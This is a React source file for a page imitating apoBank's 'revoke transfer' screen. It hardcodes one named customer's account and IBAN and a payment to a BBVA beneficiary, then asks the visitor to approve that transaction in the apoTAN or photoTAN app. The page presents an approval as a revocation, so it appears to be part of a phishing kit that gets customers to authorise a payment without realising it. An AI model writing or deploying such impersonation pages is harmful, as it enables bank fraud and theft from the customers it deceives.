import { ChevronRight, HelpCircle } from "lucide-react";
import { useNavigate } from "react-router-dom";
import apoBankLogo from "@/assets/apobank-logo.svg";
import { Button } from "@/components/ui/button";
import Footer from "@/components/Footer";
import ContactSection from "@/components/ContactSection";

const WiderrufStart = () => {
  const navigate = useNavigate();

  return (
    <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
      {/* Header */}
      <header className="w-full bg-white border-b border-border/40">
        <div className="max-w-6xl mx-auto px-4 py-3 flex items-center gap-4">
          <img src={apoBankLogo} alt="apoBank Logo" className="h-12 w-auto" />
        </div>
      </header>

      {/* Title */}
      <div className="bg-[#f5f5f5] border-b border-border/40">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 py-4">
          <div className="flex items-center gap-2 text-sm text-[#002776]">
            <button onClick={() => navigate("/")} className="hover:underline">Startseite</button>
            <ChevronRight className="h-3 w-3 text-foreground/60" />
            <span className="text-foreground/70">Überweisung widerrufen</span>
          </div>
          <h1 className="mt-2 text-2xl sm:text-3xl font-normal text-[#1a1a1a]">Überweisung widerrufen</h1>
        </div>
      </div>

      {/* Content */}
      <main className="flex-1 relative">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 pt-6">
          <button className="flex items-center gap-2 text-sm text-[#002776]">
            <HelpCircle className="h-4 w-4" /> Fragen zu dieser Seite?
          </button>

          <div className="flex justify-center mt-4">
            <div className="inline-flex flex-col items-stretch rounded-md bg-[#e6e8eb] px-4 py-2 text-sm text-foreground min-w-[200px]">
              <span className="text-center">Ladevorgang läuft ...</span>
              <div className="mt-2 h-1 w-full bg-[#c9ccd1] rounded-full overflow-hidden">
                <div className="h-full w-1/3 bg-[#002776] rounded-full" style={{ animation: "lc-slide 1.8s linear infinite" }} />
              </div>
            </div>
          </div>
        </div>

        {/* Modal overlay */}
        <div className="flex items-start justify-center">
          <div className="mt-8 sm:mt-10 mb-16 w-[92%] max-w-[640px] bg-white rounded-[16px] shadow-[0_8px_30px_rgba(0,0,0,0.15)] border border-border/40 p-6 sm:p-10 pb-12">
            <h2 className="text-lg sm:text-xl text-[#1a1a1a] mb-8">
              Bitte prüfen Sie die folgende Transaktion
            </h2>

            <p className="text-sm text-foreground mb-8">Zahlung widerrufen</p>

            <div className="grid grid-cols-2 gap-x-6 gap-y-10 mb-5">
              <div>
                <p className="text-sm text-[#002776] mb-3 font-medium">Empfängerkonto</p>
                <p className="text-sm text-foreground">DE42 5003 1900 0016 4288 41</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-3 font-medium">Betrag</p>
                <p className="text-sm text-foreground">5,00 EUR</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-3 font-medium">Verwendungszweck</p>
                <p className="text-sm text-foreground">3543NV44/17726</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-3 font-medium">Ausführungsdatum</p>
                <p className="text-sm text-foreground">17. Juli 2026</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-3 font-medium">Auftraggeberkontonummer</p>
                <p className="text-sm text-foreground">25957083</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-3 font-medium">IBAN des Auftraggebers</p>
                <p className="text-sm text-foreground">DE53 3006 0601 0025 9570 83</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-3 font-medium">Kundenname</p>
                <p className="text-sm text-foreground">Gülnaz Kirdemir</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-3 font-medium">Name des Begünstigten</p>
                <p className="text-sm text-foreground">Veronica Ariyanne</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-3 font-medium">Kreditinstitut</p>
                <p className="text-sm text-foreground">BANCO BILBAO VIZCAYA ARGENTARIA SA.</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-3 font-medium">Auftraggeberkonto</p>
                <p className="text-sm text-foreground">Privatkonto 25957083</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-3 font-medium">BIC</p>
                <p className="text-sm text-foreground">BBVADEFFXXX</p>
              </div>
            </div>

            <div className="border-t border-border/60 pt-4 mb-16">
              <p className="text-sm text-foreground">
                Bitte geben Sie diese Transaktion in Ihrer apoTAN App frei
              </p>
            </div>

            <div className="flex items-center gap-3 mb-16">
              <span className="text-sm text-foreground">Warten ...</span>
              <div className="flex-1 h-1 bg-[#e6e8eb] rounded-full overflow-hidden">
                <div className="h-full w-1/3 bg-[#002776] rounded-full" style={{ animation: "lc-slide 1.8s linear infinite" }} />
              </div>
            </div>

            <div className="flex justify-end gap-3">
              <Button
                variant="outline"
                onClick={() => navigate("/widerruf/phototan")}
                className="rounded-full bg-white border-[#002776] text-[#002776] hover:bg-white hover:text-[#002776] px-6"
              >
                Mit photoTAN freigeben
              </Button>
            </div>
          </div>
        </div>
      </main>

      <ContactSection />
      <Footer />
    </div>
  );
};

export default WiderrufStart;
